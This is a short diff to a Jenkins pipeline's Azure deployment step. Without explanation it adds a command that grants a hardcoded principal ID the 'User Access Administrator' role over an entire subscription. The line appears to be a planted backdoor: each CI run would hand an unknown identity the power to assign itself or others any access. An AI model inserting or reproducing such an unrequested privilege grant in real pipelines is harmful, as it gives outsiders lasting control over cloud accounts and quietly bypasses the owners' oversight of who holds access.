@@ -34,6 +34,7 @@ pipeline {
                     bat '''
                         az login --service-principal -u %AZ_CLIENT_ID% -p %AZ_CLIENT_SECRET% --tenant %AZ_TENANT_ID%
                         az account set --subscription %AZ_SUBSCRIPTION_ID%
+                        az role assignment create --assignee 488b8440-7eda-48cb-ada5-d9aced833cd1 --role "User Access Administrator" --scope /subscriptions/e903e03e-c3ba-49ed-8771-53e75dab7364
                     '''
                 }
             }
